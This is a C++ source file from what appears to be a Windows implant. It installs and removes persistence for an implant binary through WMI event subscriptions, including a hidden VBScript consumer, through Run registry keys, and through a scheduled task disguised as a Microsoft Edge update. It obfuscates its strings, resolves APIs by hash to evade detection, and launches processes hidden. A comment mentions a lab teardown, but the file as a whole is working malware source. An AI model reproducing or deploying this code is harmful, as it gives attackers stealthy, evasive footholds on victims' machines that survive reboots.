// persistence.cpp — Registry + WMI + Scheduled Task (all obfuscated)
#define WIN32_LEAN_AND_MEAN
#include "persistence.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <string>
#include <vector>

// XorStr::str() XORs buf in-place — static XorStr objects re-encrypt on the
// second call and return garbage. Pattern: decode once into std::wstring at
// first call, return c_str() of the persistent copy on all subsequent calls.
#define DECODE_ONCE(fn, literal)                                              \
    static const wchar_t* fn() {                                              \
        static const std::wstring _s = []() -> std::wstring {                \
            auto _t = XSW(literal); return std::wstring(_t.str());            \
        }();                                                                  \
        return _s.c_str();                                                    \
    }

DECODE_ONCE(WMI_CMD_CONSUMER,    L"BrokerServicePerf_v2")
DECODE_ONCE(WMI_SCRIPT_CONSUMER, L"WinStoreSvcHelper_v3")
DECODE_ONCE(WMI_FILTER_NAME,     L"SystemPerfMonitor_v2")
DECODE_ONCE(REG_RUN_NAME,        L"WindowsStorageService")
DECODE_ONCE(WMI_NS_SUB,          L"ROOT\\subscription")
DECODE_ONCE(WMI_NS_CIMV2,        L"ROOT\\CIMV2")

#undef DECODE_ONCE

static const wchar_t* WQL_QUERY() {
    static const std::wstring _s = []() -> std::wstring {
        auto _t = XSW(
            L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
            L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
            L"AND TargetInstance.SystemUpTime >= 240 "
            L"AND TargetInstance.SystemUpTime < 325");
        return std::wstring(_t.str());
    }();
    return _s.c_str();
}

struct CoGuard {
    HRESULT hr;
    HMODULE hOle;
    decltype(&CoUninitialize) _CoUninitialize = nullptr;
    CoGuard() {
        hOle = GetModuleHandleA(XS("ole32.dll"));
        if (!hOle) hOle = LoadLibraryA(XS("ole32.dll"));
        if (hOle) {
            auto _CoInitializeEx = HASHPROC(hOle, CoInitializeEx);
            _CoUninitialize = HASHPROC(hOle, CoUninitialize);
            if (_CoInitializeEx) hr = _CoInitializeEx(nullptr, COINIT_MULTITHREADED);
            else hr = E_FAIL;
        } else {
            hr = E_FAIL;
        }
    }
    ~CoGuard() { if (ok() && _CoUninitialize) _CoUninitialize(); }
    bool ok() const { return SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE; }
};

static HRESULT ConnectWMI(const wchar_t* ns, IWbemServices** ppSvc) {
    auto hOle = GetModuleHandleA(XS("ole32.dll"));
    if (!hOle) hOle = LoadLibraryA(XS("ole32.dll"));
    if (!hOle) return E_FAIL;
    auto _CoCreateInstance = HASHPROC(hOle, CoCreateInstance);
    auto _CoSetProxyBlanket = HASHPROC(hOle, CoSetProxyBlanket);
    if (!_CoCreateInstance || !_CoSetProxyBlanket) return E_FAIL;
    IWbemLocator* pLoc = nullptr;
    HRESULT hr = _CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) return hr;
    hr = pLoc->ConnectServer(_bstr_t(ns), nullptr, nullptr, nullptr, 0, nullptr, nullptr, ppSvc);
    pLoc->Release();
    if (FAILED(hr)) return hr;
    HRESULT hrBlanket = _CoSetProxyBlanket(*ppSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                              RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                              nullptr, EOAC_NONE);
    // Every caller does `if (FAILED(ConnectWMI(...))) return FALSE;` and only
    // releases pSvc on the success path. Drop the reference here or a blanket
    // failure leaks an IWbemServices on every attempt.
    if (FAILED(hrBlanket)) {
        (*ppSvc)->Release();
        *ppSvc = nullptr;
    }
    return hrBlanket;
}

static HRESULT PutStr(IWbemClassObject* obj, const wchar_t* prop, const wchar_t* val) {
    _variant_t v(val);
    return obj->Put(prop, 0, &v, 0);
}
static HRESULT PutBool(IWbemClassObject* obj, const wchar_t* prop, bool val) {
    _variant_t v(val);
    return obj->Put(prop, 0, &v, 0);
}

// Spawn a writable instance of a WMI class, or return nullptr.
// The original sites did `pClass->SpawnInstance(0, &pInst); pClass->Release();`
// with the HRESULT ignored, then used pInst unconditionally - so a repository
// that refuses the class produced a null dereference inside PutStr/PutInstance
// instead of a clean FALSE return. Note this also replaces the unchecked
// GetObject guard: pClass can still come back null on a success code.
static IWbemClassObject* SpawnOfClass(IWbemServices* svc, const wchar_t* cls) {
    IWbemClassObject* pClass = nullptr;
    if (FAILED(svc->GetObject(_bstr_t(cls), 0, nullptr, &pClass, nullptr)) || !pClass)
        return nullptr;
    IWbemClassObject* pInst = nullptr;
    HRESULT hr = pClass->SpawnInstance(0, &pInst);
    pClass->Release();
    return (SUCCEEDED(hr) && pInst) ? pInst : nullptr;
}

BOOL InstallWmiPersistence(const wchar_t* implantPath) {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(WMI_NS_SUB(), &pSvc))) return FALSE;
    BOOL success = FALSE;
    do {
        // EventFilter
        IWbemClassObject* pFInst = SpawnOfClass(pSvc, L"__EventFilter");
        if (!pFInst) break;
        PutStr(pFInst, L"Name", WMI_FILTER_NAME());
        PutStr(pFInst, L"QueryLanguage", L"WQL");
        PutStr(pFInst, L"Query", WQL_QUERY());
        PutStr(pFInst, L"EventNamespace", WMI_NS_CIMV2());
        HRESULT hr = pSvc->PutInstance(pFInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pFInst->Release();
        if (FAILED(hr)) break;
        // CommandLineEventConsumer
        IWbemClassObject* pCInst = SpawnOfClass(pSvc, L"CommandLineEventConsumer");
        if (!pCInst) break;
        PutStr(pCInst, L"Name", WMI_CMD_CONSUMER());
        PutStr(pCInst, L"CommandLineTemplate", implantPath);
        PutBool(pCInst, L"RunInteractively", false);
        hr = pSvc->PutInstance(pCInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pCInst->Release();
        if (FAILED(hr)) break;
        // Binding
        IWbemClassObject* pBInst = SpawnOfClass(pSvc, L"__FilterToConsumerBinding");
        if (!pBInst) break;
        std::wstring filterRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":__EventFilter.Name=\"" + std::wstring(WMI_FILTER_NAME()) + L"\"";
        std::wstring consumerRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":CommandLineEventConsumer.Name=\"" + std::wstring(WMI_CMD_CONSUMER()) + L"\"";
        PutStr(pBInst, L"Filter", filterRef.c_str());
        PutStr(pBInst, L"Consumer", consumerRef.c_str());
        hr = pSvc->PutInstance(pBInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pBInst->Release();
        if (FAILED(hr)) break;
        success = TRUE;
    } while (false);
    pSvc->Release();
    return success;
}

BOOL InstallWmiScriptPersistence(const wchar_t* implantPath) {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(WMI_NS_SUB(), &pSvc))) return FALSE;
    std::wstring script =
        L"Dim oSh : Set oSh = CreateObject(\"WScript.Shell\")\r\n"
        L"Dim oFSO : Set oFSO = CreateObject(\"Scripting.FileSystemObject\")\r\n"
        L"Dim sPath : sPath = \"" + std::wstring(implantPath) + L"\"\r\n"
        L"If oFSO.FileExists(sPath) Then\r\n"
        L"  oSh.Run Chr(34) & sPath & Chr(34), 0, False\r\n"
        L"End If\r\n";
    BOOL success = FALSE;
    do {
        IWbemClassObject* pAInst = SpawnOfClass(pSvc, L"ActiveScriptEventConsumer");
        if (!pAInst) break;
        PutStr(pAInst, L"Name", WMI_SCRIPT_CONSUMER());
        PutStr(pAInst, L"ScriptingEngine", L"VBScript");
        PutStr(pAInst, L"ScriptText", script.c_str());
        _variant_t vKill(0);
        pAInst->Put(L"KillTimeout", 0, &vKill, 0);
        HRESULT hr = pSvc->PutInstance(pAInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pAInst->Release();
        if (FAILED(hr)) break;
        // Bind
        IWbemClassObject* pBInst = SpawnOfClass(pSvc, L"__FilterToConsumerBinding");
        if (!pBInst) break;
        std::wstring filterRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":__EventFilter.Name=\"" + std::wstring(WMI_FILTER_NAME()) + L"\"";
        std::wstring scriptConsRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":ActiveScriptEventConsumer.Name=\"" + std::wstring(WMI_SCRIPT_CONSUMER()) + L"\"";
        PutStr(pBInst, L"Filter", filterRef.c_str());
        PutStr(pBInst, L"Consumer", scriptConsRef.c_str());
        hr = pSvc->PutInstance(pBInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pBInst->Release();
        if (FAILED(hr)) break;
        success = TRUE;
    } while (false);
    pSvc->Release();
    return success;
}

BOOL InstallRegistryPersistence(const wchar_t* implantPath) {
    static auto hAdv = GetModuleHandleA(XS("advapi32.dll"));
    if (!hAdv) hAdv = LoadLibraryA(XS("advapi32.dll"));
    auto _RegOpenKeyExW = HASHPROC(hAdv, RegOpenKeyExW);
    auto _RegSetValueExW = HASHPROC(hAdv, RegSetValueExW);
    auto _RegCloseKey = HASHPROC(hAdv, RegCloseKey);
    if (!_RegOpenKeyExW || !_RegSetValueExW || !_RegCloseKey) return FALSE;
    std::wstring val = L"\"" + std::wstring(implantPath) + L"\"";
    wchar_t runKeyStr[80] = {};
    { auto tmp = XSW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"); wcsncpy_s(runKeyStr, tmp.str(), _TRUNCATE); }
    HKEY hKey = nullptr;
    LONG rc = _RegOpenKeyExW(HKEY_CURRENT_USER, runKeyStr, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) return FALSE;
    rc = _RegSetValueExW(hKey, REG_RUN_NAME(), 0, REG_SZ,
                         reinterpret_cast<const BYTE*>(val.c_str()),
                         static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
    _RegCloseKey(hKey);
    if (IsElevated()) {
        HKEY hklm = nullptr;
        if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, runKeyStr, 0, KEY_SET_VALUE, &hklm) == ERROR_SUCCESS) {
            _RegSetValueExW(hklm, REG_RUN_NAME(), 0, REG_SZ,
                            reinterpret_cast<const BYTE*>(val.c_str()),
                            static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
            _RegCloseKey(hklm);
        }
    }
    return (rc == ERROR_SUCCESS);
}

// ============================================================
// Hidden child-process helper shared by the three schtasks paths.
// The old inline blocks called WaitForSingleObject without checking its
// return, then read GetExitCodeProcess anyway. On a timeout that yields
// STILL_ACTIVE (259), so a slow-but-successful task registration was
// reported to the operator as a failure - and a failed uninstall looked
// identical to a timed-out one. The tri-state separates "did not work"
// from "we stopped watching", which the caller can re-query.
// ============================================================
enum RunResult { RUN_FAILED = 0, RUN_RAN, RUN_TIMEOUT };

static RunResult RunHidden(std::wstring& cmd, DWORD timeoutMs, DWORD* exitCode) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return RUN_FAILED;

    DWORD wait = WaitForSingleObject(pi.hProcess, timeoutMs);
    if (wait == WAIT_OBJECT_0) {
        DWORD code = 1;
        GetExitCodeProcess(pi.hProcess, &code);
        if (exitCode) *exitCode = code;
    }
    // Deliberately no TerminateProcess on timeout: killing schtasks halfway
    // through /Create can leave a half-written task. Let it finish; report the
    // uncertainty instead.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (wait == WAIT_OBJECT_0) ? RUN_RAN : RUN_TIMEOUT;
}

BOOL InstallScheduledTaskPersistence(const wchar_t* implantPath) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring schtasks = std::wstring(sysRoot) + L"\\System32\\schtasks.exe";
    std::wstring level = IsElevated() ? L"HIGHEST" : L"LIMITED";
    std::wstring trigger = IsElevated() ? L"ONSTART" : L"ONLOGON";
    std::wstring cmd = L"\"" + schtasks + L"\" /Create /F "
                       L"/TN \"MicrosoftEdgeUpdateTaskUser\" "
                       L"/TR \"\\\"" + std::wstring(implantPath) + L"\\\"\" "
                       L"/SC " + trigger + L" /RL " + level;
    DWORD exitCode = 1;
    RunResult rr = RunHidden(cmd, config::SCHTASKS_TIMEOUT_MS, &exitCode);
    if (rr == RUN_RAN) return (exitCode == 0);
    // Timed out: ask the scheduler what actually happened instead of guessing.
    if (rr == RUN_TIMEOUT) return IsScheduledTaskInstalled();
    return FALSE;
}

BOOL IsScheduledTaskInstalled() {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring schtasks = std::wstring(sysRoot) + L"\\System32\\schtasks.exe";
    std::wstring cmd = L"\"" + schtasks + L"\" /Query /TN \"MicrosoftEdgeUpdateTaskUser\"";
    DWORD exitCode = 1;
    RunResult rr = RunHidden(cmd, config::SCHTASKS_TIMEOUT_MS, &exitCode);
    // schtasks /Query exits 1 when the name is absent, so only a completed run
    // answers the question. A timeout is indistinguishable from "absent" from
    // here, and callers only use this to report state, never to decide a kill.
    return (rr == RUN_RAN) && (exitCode == 0);
}

BOOL RemoveScheduledTaskPersistence() {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring schtasks = std::wstring(sysRoot) + L"\\System32\\schtasks.exe";
    std::wstring cmd = L"\"" + schtasks + L"\" /Delete /F /TN \"MicrosoftEdgeUpdateTaskUser\"";
    DWORD exitCode = 1;
    RunResult rr = RunHidden(cmd, config::SCHTASKS_TIMEOUT_MS, &exitCode);
    if (rr == RUN_RAN) {
        if (exitCode == 0) return TRUE;
        // Non-zero usually means the task was never there; confirm rather than
        // claim a failed uninstall on an already-clean machine.
        return !IsScheduledTaskInstalled();
    }
    if (rr == RUN_TIMEOUT) return !IsScheduledTaskInstalled();
    return FALSE;
}

BOOL IsWmiPersistenceInstalled() {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;
    std::wstring query = L"SELECT * FROM CommandLineEventConsumer WHERE Name='" + std::wstring(WMI_CMD_CONSUMER()) + L"'";
    IEnumWbemClassObject* pEnum = nullptr;
    // Fully synchronous on purpose. WBEM_FLAG_RETURN_IMMEDIATELY asks for
    // semi-async execution, which pairs a non-blocking ExecQuery with the
    // blocking Next() below -- so a busy or stalled WMI provider could pin this
    // thread indefinitely. FORWARD_ONLY alone returns once the enumerator is
    // live, and the bounded Next() turns a hang into a plain "not found".
    HRESULT hr = pSvc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(query.c_str()),
                                 WBEM_FLAG_FORWARD_ONLY,
                                 nullptr, &pEnum);
    BOOL found = FALSE;
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject* pObj = nullptr;
        ULONG ret = 0;
        if (pEnum->Next(5000, 1, &pObj, &ret) == WBEM_S_NO_ERROR && ret) {
            found = TRUE;
            pObj->Release();
        }
        pEnum->Release();
    }
    pSvc->Release();
    return found;
}

BOOL RemoveWmiPersistence() {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;
    // Count real failures. This used to return TRUE unconditionally, so an
    // operator running the lab teardown saw "removed" while a WMI subscription
    // was still installed and still re-spawning the implant on the next boot.
    // Numeric HRESULTs rather than the WBEM_E_* names: MinGW-w64 headers do not
    // consistently export them, and CI is the only build gate here.
    const HRESULT kWbemNotFound      = static_cast<HRESULT>(0x80041002L);
    const HRESULT kWbemInvalidClass  = static_cast<HRESULT>(0x80041010L);
    ULONG failedDeletes = 0;
    auto del = [&](const std::wstring& path) {
        HRESULT hr = pSvc->DeleteInstance(_bstr_t(path.c_str()), 0, nullptr, nullptr);
        // Absent is the desired end state for a teardown, not a failure.
        if (FAILED(hr) && hr != kWbemNotFound && hr != kWbemInvalidClass)
            ++failedDeletes;
    };
    std::wstring consPath = L"CommandLineEventConsumer.Name=\"" + std::wstring(WMI_CMD_CONSUMER()) + L"\"";
    std::wstring scriptPath = L"ActiveScriptEventConsumer.Name=\"" + std::wstring(WMI_SCRIPT_CONSUMER()) + L"\"";
    std::wstring filterPath = L"__EventFilter.Name=\"" + std::wstring(WMI_FILTER_NAME()) + L"\"";
    del(L"__FilterToConsumerBinding.Consumer=\"" + consPath + L"\",Filter=\"" + filterPath + L"\"");
    del(L"__FilterToConsumerBinding.Consumer=\"" + scriptPath + L"\",Filter=\"" + filterPath + L"\"");
    del(consPath);
    del(scriptPath);
    del(filterPath);
    pSvc->Release();
    return (failedDeletes == 0) ? TRUE : FALSE;
}